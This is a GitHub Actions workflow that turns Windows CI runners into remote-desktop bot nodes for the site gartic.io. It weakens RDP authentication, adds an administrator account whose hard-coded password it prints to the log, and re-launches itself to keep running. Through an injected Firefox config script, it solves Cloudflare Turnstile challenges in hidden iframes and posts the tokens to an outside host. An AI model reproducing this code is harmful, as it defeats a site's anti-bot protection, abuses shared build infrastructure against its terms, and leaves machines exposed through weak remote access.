name: ˢᵃᶤᶠ ₉₁

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

permissions:
  actions: write
  contents: read

jobs:
  gartic-bot:
    runs-on: windows-2019
    timeout-minutes: 360
    strategy:
      matrix:
        rdp_node: [1, 2]

    steps:
      - name: 1. Configure RDP
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          netsh advfirewall firewall add rule name="Allow-RDP" dir=in action=allow protocol=TCP localport=3389

      - name: 2. Inject Script (Reliable Method)
        run: |
          $dir = "C:\Program Files\Mozilla Firefox"
          if (!(Test-Path "$dir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$dir\defaults\pref" }
          'pref("general.config.filename", "mozilla.cfg");' + "`n" + 'pref("general.config.obscure_value", 0);' | Out-File "$dir\defaults\pref\local-settings.js" -Encoding ASCII -Force
          
          $q = [char]34; $s = [char]39
          $c = '//' + "`n" + 'try { window.addEventListener(' + $s + 'load' + $s + ', function() { if (location.href.includes(' + $s + 'gartic.io' + $s + ')) { setInterval(function() { location.reload(); }, 50000); function send(t) { if (typeof t !== ' + $s + 'string' + $s + ' || t.length <= 20) return; fetch(' + $s + 'https://www.xsw.work.gd/add-token' + $s + ', { method: ' + $s + 'POST' + $s + ', headers: { ' + $s + 'Content-Type' + $s + ': ' + $s + 'application/json' + $s + ' }, body: JSON.stringify({ token: t }) }).catch(function() {}); } window.addEventListener(' + $s + 'message' + $s + ', function(e) { if (e.data && typeof e.data === ' + $s + 'string' + $s + ') { send(e.data); } }); for (var i = 0; i < 6; i++) { var f = document.createElement(' + $s + 'iframe' + $s + '); f.style.display = ' + $s + 'none' + $s + '; f.srcdoc = ' + $s + '<html><body><script src=' + $q + 'https://challenges.cloudflare.com/turnstile/v0/api.js' + $q + ' async defer></script><div id=' + $q + 'cf-turnstile' + $q + '></div><script>function r(){try{window.turnstile.render(' + $q + '#cf-turnstile' + $q + ',{sitekey:' + $q + '0x4AAAAAABBPKaIbNwnPEfSo' + $q + ',callback:function(t){parent.postMessage(t,' + $q + '*' + $q + ');}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>' + $s + '; document.body.appendChild(f); } } }); } catch (e) {}'
          $c | Out-File "$dir\mozilla.cfg" -Encoding ASCII -Force

      - name: 3. Create User & Run File
        run: |
          $password = "admin@123"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "saif123" -Password $securePass -AccountNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "saif123"
          
          # كتابة ملف التشغيل في مكان مضمون (C:\)
          $batchContent = '"C:\Program Files\Mozilla Firefox\firefox.exe" -url https://gartic.io -url https://gartic.io'
          $batchContent | Out-File "C:\start_bot.bat" -Encoding ASCII
          
          # جعل السيرفر يفتح المتصفح فوراً (حتى لو في الخلفية) لضمان بدء الجمع
          Start-Process "C:\start_bot.bat"

      - name: 4. Tailscale Setup
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
          Invoke-WebRequest -Uri $tsUrl -OutFile "$env:TEMP\tailscale.exe"
          Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet", "/norestart" -Wait
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="gartic-node-${{ matrix.rdp_node }}"

      - name: 5. Notification & Loop
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          echo "::notice title=RDP READY::IP: $ip | User: saif123 | Pass: admin@123"
          Start-Sleep -Seconds 20700
          gh workflow run "ˢᵃᶤᶠ ₉₁"
